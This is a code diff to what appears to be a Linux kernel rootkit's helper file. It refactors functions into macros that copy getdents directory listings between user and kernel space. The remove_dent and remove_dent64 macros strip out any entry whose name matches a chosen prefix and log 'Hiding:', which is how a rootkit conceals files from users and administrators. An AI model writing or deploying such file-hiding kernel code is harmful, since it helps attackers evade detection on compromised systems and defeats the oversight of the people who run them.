@@ -195,112 +195,110 @@ print_module_list(void)
 }
 
 
-void
-print_dents(struct linux_dirent *dirp, long total)
-{
-    char *buff;
-    long index;
-    struct linux_dirent *cur;
-
-    // TODO: Use another size?
-    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-    if (!buff) {
-        fm_alert("%s\n", "kmalloc failed.");
-        return;
-    }
-
-    strlcpy(buff, dirp->d_name, PAGE_SIZE);
-    index = dirp->d_reclen;
-    cur = (struct linux_dirent *)((unsigned long)dirp + index);
-    while (index < total) {
-        strlcat(buff, " ", PAGE_SIZE);
-        strlcat(buff, cur->d_name, PAGE_SIZE);
-        index += cur->d_reclen;
-        cur = (struct linux_dirent *)((unsigned long)dirp + index);
-    }
-
-    fm_info("%s\n", buff);
-    kfree(buff);
-
-    return;
+#define DEFINE_PRINT_DENTS(FN, T)                    \
+void FN(struct T __user *dirp, long total)\
+{\
+    char *buff;\
+    long index;\
+    struct T *cur;\
+    struct T *kent;\
+    if (!total) {\
+        return;\
+    }\
+\
+    kent = kmalloc(total, GFP_KERNEL);\
+    if (!kent) {\
+        fm_alert("kmalloc failed for kent!!!");\
+        return;\
+    }\
+\
+    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);\
+    if (!buff) {\
+        fm_alert("%s\n", "kmalloc failed for buff.");\
+        goto error_after_kent;\
+    }\
+\
+    if (copy_from_user(kent, dirp, total)) {\
+        fm_alert("copy_from_user failed!!!");\
+        goto error_after_buff;\
+    }\
+    strlcpy(buff, kent->d_name, PAGE_SIZE);\
+    index = kent->d_reclen;\
+    cur = (struct T *)((unsigned long)kent + index);\
+    while (index < total) {\
+        strlcat(buff, " ", PAGE_SIZE);\
+        strlcat(buff, cur->d_name, PAGE_SIZE);\
+        index += cur->d_reclen;\
+        cur = (struct T *)((unsigned long)kent + index);\
+    }\
+\
+    fm_info("%s\n", buff);\
+\
+ error_after_buff:\
+    kfree(buff);\
+\
+ error_after_kent:\
+    kfree(kent);\
+\
+    return;\
 }
 
 
-void
-print_dents64(struct linux_dirent64 *dirp, long total)
-{
-    char *buff;
-    long index;
-    struct linux_dirent64 *cur;
+DEFINE_PRINT_DENTS(print_dents, linux_dirent);
 
-    // TODO: Use another size?
-    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-    if (!buff) {
-        fm_alert("%s\n", "kmalloc failed.");
-        return;
-    }
+DEFINE_PRINT_DENTS(print_dents64, linux_dirent64);
 
-    strlcpy(buff, dirp->d_name, PAGE_SIZE);
-    index = dirp->d_reclen;
-    cur = (struct linux_dirent64 *)((unsigned long)dirp + index);
-    while (index < total) {
-        strlcat(buff, " ", PAGE_SIZE);
-        strlcat(buff, cur->d_name, PAGE_SIZE);
-        index += cur->d_reclen;
-        cur = (struct linux_dirent64 *)((unsigned long)dirp + index);
-    }
 
-    fm_info("%s\n", buff);
-    kfree(buff);
-
-    return;
+#define DEFINE_REMOVE_DENT(FN, T)\
+long FN(char *name, struct T __user *dirp, long total)\
+{\
+    struct T *kent;\
+    struct T *cur;\
+    long index = 0;\
+\
+    if (!total) {\
+        return total;\
+    }\
+\
+    kent = kmalloc(total, GFP_KERNEL);\
+    if (!kent) {\
+        fm_alert("kmalloc failed for kent!!!");\
+        return total;\
+    }\
+    if (copy_from_user(kent, dirp, total)) {\
+        fm_alert("copy_from_user failed!!!");\
+        goto error_after_kent;\
+    }\
+\
+    cur = kent;\
+    while (index < total) {\
+        if (strncmp(cur->d_name, name, strlen(name)) == 0) {\
+            unsigned long next = (unsigned long)cur + cur->d_reclen;\
+            long rest = (unsigned long)kent + total - next;\
+            long reclen = cur->d_reclen;\
+            fm_alert("Hiding: %s\n", cur->d_name);\
+            memmove(cur, (void *)next, rest);\
+            total -= reclen;\
+        }\
+        index += cur->d_reclen;\
+        cur = (struct T *)((unsigned long)kent + index);\
+    }\
+\
+    if (copy_to_user(dirp, kent, total)) {\
+        fm_alert("copy_to_user failed!!!");\
+        goto error_after_kent;\
+    }\
+\
+ error_after_kent:\
+    kfree(kent);\
+    return total;\
 }
 
 
-long
-remove_dent(char *name, struct linux_dirent *dirp, long total)
-{
-    struct linux_dirent *cur = dirp;
-    long index = 0;
-
-    while (index < total) {
-        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
-            unsigned long next = (unsigned long)cur + cur->d_reclen;
-            long rest = (unsigned long)dirp + total - next;
-            long reclen = cur->d_reclen;
-            fm_alert("Hiding: %s\n", cur->d_name);
-            memmove(cur, (void *)next, rest);
-            total -= reclen;
-        }
-        index += cur->d_reclen;
-        cur = (struct linux_dirent *)((unsigned long)dirp + index);
-    }
-
-    return total;
-}
+DEFINE_REMOVE_DENT(remove_dent, linux_dirent);
 
 
-long
-remove_dent64(char *name, struct linux_dirent64 *dirp, long total)
-{
-    struct linux_dirent64 *cur = dirp;
-    long index = 0;
-
-    while (index < total) {
-        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
-            unsigned long next = (unsigned long)cur + cur->d_reclen;
-            long rest = (unsigned long)dirp + total - next;
-            long reclen = cur->d_reclen;
-            fm_alert("Hiding: %s\n", cur->d_name);
-            memmove(cur, (void *)next, rest);
-            total -= reclen;
-        }
-        index += cur->d_reclen;
-        cur = (struct linux_dirent64 *)((unsigned long)dirp + index);
-    }
-
-    return total;
-}
+DEFINE_REMOVE_DENT(remove_dent64, linux_dirent64);
 
 
 # if defined(__x86_64__)
